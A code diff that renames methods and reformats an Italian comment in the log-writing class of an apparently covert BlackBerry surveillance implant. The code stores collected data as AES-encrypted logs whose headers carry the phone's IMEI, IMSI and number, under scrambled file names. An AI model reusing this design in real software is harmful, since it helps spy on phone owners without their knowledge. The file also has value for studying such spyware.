@@ -28,34 +28,34 @@ import com.ht.rcs.blackberry.utils.DebugLevel;
 import com.ht.rcs.blackberry.utils.Utils;
 import com.ht.rcs.blackberry.utils.WChar;
 
-/*			LOG FORMAT
+/*  LOG FORMAT
  *
  *  -- Naming Convention
- *	Il formato dei log e' il seguente:
- *	Il nome del file in chiaro ha questa forma: ID_AGENTE-LOG_TYPE-SEQUENCE.mob
- *	e si presenta cosi': xxxx-xxxx-dddd.mob
- *	Il primo gruppo e' formato generalmente da 4 cifre in esadecimali, il secondo
- *	e' formato generalmente da una cifra esadecimale, il terzo gruppo e' un numero
- *	di sequenza in formato decimale. Ognuno dei tre gruppi puo' essere composto da
- *	1 fino a 8 cifre. Il nome del file viene scramblato con il primo byte della
- *	chiave utilizzata per il challenge.
+ *  Il formato dei log e' il seguente:
+ *  Il nome del file in chiaro ha questa forma: ID_AGENTE-LOG_TYPE-SEQUENCE.mob
+ *  e si presenta cosi': xxxx-xxxx-dddd.mob
+ *  Il primo gruppo e' formato generalmente da 4 cifre in esadecimali, il secondo
+ *  e' formato generalmente da una cifra esadecimale, il terzo gruppo e' un numero
+ *  di sequenza in formato decimale. Ognuno dei tre gruppi puo' essere composto da
+ *  1 fino a 8 cifre. Il nome del file viene scramblato con il primo byte della
+ *  chiave utilizzata per il challenge.
  *
- *	-- Header
- *	Il log cifrato e' cosi' composto:
- *	all'inizio del file viene scritta una LogStruct non cifrata, il membro FileSize indica la
- *	lunghezza complessiva di tutto il file. Dopo la LogStruct troviamo il filename in WCHAR,
- *	quindi i byte di AdditionalData se presenti e poi il contenuto vero e proprio.
+ *  -- Header
+ *  Il log cifrato e' cosi' composto:
+ *  all'inizio del file viene scritta una LogStruct non cifrata, il membro FileSize indica la
+ *  lunghezza complessiva di tutto il file. Dopo la LogStruct troviamo il filename in WCHAR,
+ *  quindi i byte di AdditionalData se presenti e poi il contenuto vero e proprio.
  *
- *	-- Data
- *	Il contenuto e' formato da una DWORD in chiaro che indica la dimensione del blocco
- *	unpadded (va quindi paddata a BLOCK_SIZE per ottenere la lunghezza del blocco cifrato)
- *	e poi il blocco di dati vero e proprio. Questa struttura puo' esser ripetuta fino alla
- *	fine del file.
+ *  -- Data
+ *  Il contenuto e' formato da una DWORD in chiaro che indica la dimensione del blocco
+ *  unpadded (va quindi paddata a BLOCK_SIZE per ottenere la lunghezza del blocco cifrato)
+ *  e poi il blocco di dati vero e proprio. Questa struttura puo' esser ripetuta fino alla
+ *  fine del file.
  *
- *	-- Global Struct
- *	|Log Struct|FileName|AdditionalData|DWORD Unpadded|Block|.....|DWORD Unpadded|Block|.....|
+ *  -- Global Struct
+ *  |Log Struct|FileName|AdditionalData|DWORD Unpadded|Block|.....|DWORD Unpadded|Block|.....|
  *
- *	Un log puo' essere composto sia da un unico blocco DWORD-Dati che da piu' blocchi DWORD-Dati.
+ *  Un log puo' essere composto sia da un unico blocco DWORD-Dati che da piu' blocchi DWORD-Dati.
  *
  */
 public class Log {
@@ -112,7 +112,7 @@ public class Log {
 
     private static Debug debug = new Debug("Log", DebugLevel.VERBOSE);
 
-    public static int ConvertTypeLog(int agentId) {
+    public static int convertTypeLog(int agentId) {
         int agentPos = agentId - Agent.AGENT;
         Check.requires(TYPE_LOG != null, "Null TypeLog");
         if (agentPos > 0 && agentPos < TYPE_LOG.length) {
@@ -151,21 +151,21 @@ public class Log {
         // timestamp = new Date();
     }
 
-    public Log(Agent agent, byte[] aesKey) {
+    public Log(Agent agent_, byte[] aesKey) {
         this();
 
-        this.agent = agent;
+        this.agent = agent_;
 
         encryption.makeKey(aesKey);
     }
 
-    public Log(Agent agent, String aesKey) {
+    public Log(Agent agent_, String aesKey) {
         this();
 
-        this.agent = agent;
+        this.agent = agent_;
 
         byte[] key = new byte[16];
-        Utils.Copy(key, 0, aesKey.getBytes(), 0, 16);
+        Utils.copy(key, 0, aesKey.getBytes(), 0, 16);
 
         encryption.makeKey(key);
     }
@@ -219,7 +219,7 @@ public class Log {
             additionalLen = additionalData.length;
         }
 
-        Vector tuple = logCollector.MakeNewName(this, agent);
+        Vector tuple = logCollector.makeNewName(this, agent);
         Check.asserts(tuple.size() == 4, "Wrong tuple size");
 
         this.progressive = ((Integer) tuple.elementAt(0)).intValue();
@@ -228,7 +228,7 @@ public class Log {
         String encName = (String) tuple.elementAt(3);
 
         String dir = basePath + blockDir + "/";
-        Path.CreateDirectory(dir);
+        Path.createDirectory(dir);
 
         fileName = dir + encName;
         Check.asserts(fileName != null, "null fileName");
@@ -248,9 +248,9 @@ public class Log {
             fconn.create();
             os = fconn.openDataOutputStream();
 
-            byte[] encBuffer = encryption.EncryptData(plainBuffer);
+            byte[] encBuffer = encryption.encryptData(plainBuffer);
             Check.asserts(encBuffer.length == Encryption
-                    .GetNextMultiple(plainBuffer.length), "Wrong encBuffer");
+                    .getNextMultiple(plainBuffer.length), "Wrong encBuffer");
 
             // scriviamo la dimensione dell'header paddato
             os.write(Utils.intToByteArray(plainBuffer.length));
@@ -290,23 +290,23 @@ public class Log {
         DateTime datetime = new DateTime(timestamp);
 
         logDescription = new LogDescription();
-        logDescription.Version = LOG_VERSION_01;
-        logDescription.LogType = ConvertTypeLog(agent.AgentId);
-        logDescription.HTimeStamp = datetime.hiDateTime();
-        logDescription.LTimeStamp = datetime.lowDateTime();
-        logDescription.AdditionalData = additionalLen;
-        logDescription.DeviceIdLen = device.getImei().length;
-        logDescription.UserIdLen = device.getImsi().length;
-        logDescription.SourceIdLen = device.getPhoneNumber().length;
+        logDescription.version = LOG_VERSION_01;
+        logDescription.logType = convertTypeLog(agent.agentId);
+        logDescription.hTimeStamp = datetime.hiDateTime();
+        logDescription.lTimeStamp = datetime.lowDateTime();
+        logDescription.additionalData = additionalLen;
+        logDescription.deviceIdLen = device.getImei().length;
+        logDescription.userIdLen = device.getImsi().length;
+        logDescription.sourceIdLen = device.getPhoneNumber().length;
 
         byte[] baseHeader = logDescription.getBytes();
         Check.asserts(baseHeader.length == logDescription.length,
                 "Wrong log len");
 
-        int headerLen = baseHeader.length + logDescription.AdditionalData
-                + logDescription.DeviceIdLen + logDescription.UserIdLen
-                + logDescription.SourceIdLen;
-        byte[] plainBuffer = new byte[Encryption.GetNextMultiple(headerLen)];
+        int headerLen = baseHeader.length + logDescription.additionalData
+                + logDescription.deviceIdLen + logDescription.userIdLen
+                + logDescription.sourceIdLen;
+        byte[] plainBuffer = new byte[Encryption.getNextMultiple(headerLen)];
 
         DataBuffer databuffer = new DataBuffer(plainBuffer, 0,
                 plainBuffer.length, false);
@@ -356,7 +356,7 @@ public class Log {
             return false;
         }
 
-        byte[] encData = encryption.EncryptData(data);
+        byte[] encData = encryption.encryptData(data);
 
         try {
             os.write(Utils.intToByteArray(data.length));
